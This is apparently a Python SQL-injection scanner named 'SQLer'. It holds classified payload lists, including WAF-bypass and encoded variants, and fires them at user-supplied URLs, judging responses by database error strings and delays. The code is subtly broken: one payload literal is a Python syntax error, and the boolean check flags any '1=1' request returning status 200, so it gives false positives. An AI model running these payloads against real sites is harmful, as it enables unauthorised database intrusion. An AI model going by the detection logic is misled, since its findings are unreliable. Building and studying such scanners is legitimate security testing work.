import argparse
import sys
import os
import time
import random
import string
import requests
from typing import List, Dict, Any

class SQLiPayloads:
    """
    Collection of advanced SQLi payloads and tampering techniques.
    """
    CLASSIC = [
        "'", '"', "'--", '"--', "')", '")', "' OR '1'='1", '" OR "1"="1',
        "' OR 1=1--", '" OR 1=1--', "' OR 'a'='a", '" OR "a"="a',
    ]
    ERROR_BASED = [
        "'", '"', "' OR 1=1--", '" OR 1=1--',
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ]
    BOOLEAN_BASED = [
        "' AND 1=1--", "' AND 1=2--", '" AND 1=1--', '" AND 1=2--',
        "') AND 1=1--", '") AND 1=1--', "') AND 1=2--", '") AND 1=2--',
    ]
    TIME_BASED = [
        "' AND SLEEP(5)-- ", '" AND SLEEP(5)-- ',
        "' WAITFOR DELAY '0:0:5'--", '" WAITFOR DELAY '0:0:5'--',
    ]
    WAF_BYPASS = [
        "'/*!50000OR*/1=1--", "' OR 1=1#", "' OR 1=1/*", "' OR 1=1-- -", "' OR 1=1--+",
        "' OR 1=1;--", "' OR 1=1;%00", "' OR 1=1;%23", "' OR 1=1;%2D%2D",
    ]
    TAMPERED = [
        "%27%20OR%201%3D1--", "%27%20OR%20%271%27%3D%271--", "%22%20OR%20%221%22%3D%221--",
    ]
    ALL = CLASSIC + ERROR_BASED + BOOLEAN_BASED + TIME_BASED + WAF_BYPASS + TAMPERED

    @staticmethod
    def random_suffix(length=4):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class SQLer:
    def __init__(self, urls: List[str]):
        self.urls = urls
        self.session = requests.Session()
        self.timeout = 10
        self.verbose = True

    def run(self):
        for url in self.urls:
            print(f"[+] Scanning: {url}")
            result = self.detect_sqli(url)
            if result['vulnerable']:
                print(f"[!!!] SQLi Detected: {url}")
                print(f"[DETAILS] {result['details']}")
            else:
                print(f"[-] No SQLi detected: {url}")

    def detect_sqli(self, url: str) -> dict:
        details = []
        vulnerable = False
        for payload in SQLiPayloads.ALL:
            test_url = self.inject_payload(url, payload)
            try:
                start = time.time()
                resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                elapsed = time.time() - start
                analysis = self.analyze_response(resp, payload, elapsed)
                if self.verbose:
                    print(f"[PAYLOAD] {payload}")
                    print(f"[RESPONSE] Status: {resp.status_code}, Time: {elapsed:.2f}s, Length: {len(resp.text)}")
                if analysis['vulnerable']:
                    details.append(analysis['details'])
                    vulnerable = True
                    # For live output, show immediately
                    print(f"[!!!] Confirmed SQLi with payload: {payload}")
                    print(f"[DETAILS] {analysis['details']}")
                    # Optionally, break on first confirmed or continue for more
            except Exception as e:
                if self.verbose:
                    print(f"[ERROR] {e}")
        return {'vulnerable': vulnerable, 'details': details if details else 'No SQLi detected'}

    def inject_payload(self, url: str, payload: str) -> str:
        # Naive: replace first parameter value with payload
        if '?' not in url or '=' not in url:
            return url  # Not injectable
        base, params = url.split('?', 1)
        param_pairs = params.split('&')
        for i, pair in enumerate(param_pairs):
            if '=' in pair:
                k, v = pair.split('=', 1)
                param_pairs[i] = f"{k}={v}{payload}"
                break  # Only first param for now
        return base + '?' + '&'.join(param_pairs)

    def analyze_response(self, resp: requests.Response, payload: str, elapsed: float) -> Dict[str, Any]:
        # Error-based
        error_signatures = [
            'You have an error in your SQL syntax',
            'Warning: mysql_',
            'Unclosed quotation mark',
            'quoted string not properly terminated',
            'SQLSTATE',
            'syntax error',
            'ORA-01756',
            'ODBC SQL Server Driver',
            'Microsoft OLE DB Provider for SQL Server',
            'PostgreSQL query failed',
            'supplied argument is not a valid MySQL',
        ]
        for sig in error_signatures:
            if sig.lower() in resp.text.lower():
                return {'vulnerable': True, 'details': f'Error-based SQLi detected with payload: {payload} | Signature: {sig}'}
        # Boolean-based
        if payload in SQLiPayloads.BOOLEAN_BASED:
            # Try to detect difference in response for true/false
            # (This is a simplified version; advanced would compare baseline responses)
            if '1=1' in payload and resp.status_code == 200:
                return {'vulnerable': True, 'details': f'Boolean-based SQLi detected with payload: {payload}'}
        # Time-based
        if payload in SQLiPayloads.TIME_BASED and elapsed > 4.5:
            return {'vulnerable': True, 'details': f'Time-based SQLi detected with payload: {payload} | Response time: {elapsed:.2f}s'}
        # WAF bypass/tampered: look for error or abnormal response
        if payload in SQLiPayloads.WAF_BYPASS + SQLiPayloads.TAMPERED:
            if any(sig.lower() in resp.text.lower() for sig in error_signatures):
                return {'vulnerable': True, 'details': f'WAF bypass SQLi detected with payload: {payload}'}
        return {'vulnerable': False, 'details': 'No SQLi detected'}

def parse_args():
    parser = argparse.ArgumentParser(description='SQLer: Advanced SQLi Detection Tool')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Target single URL')
    group.add_argument('-l', '--list', help='File with list of URLs (one per line)')
    return parser.parse_args()

def main():
    args = parse_args()
    urls = []
    if args.url:
        urls = [args.url]
    elif args.list:
        if not os.path.isfile(args.list):
            print(f"[ERROR] List file not found: {args.list}")
            sys.exit(1)
        with open(args.list, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    if not urls:
        print("[ERROR] No URLs provided.")
        sys.exit(1)
    sqler = SQLer(urls)
    sqler.run()

if __name__ == '__main__':
    main()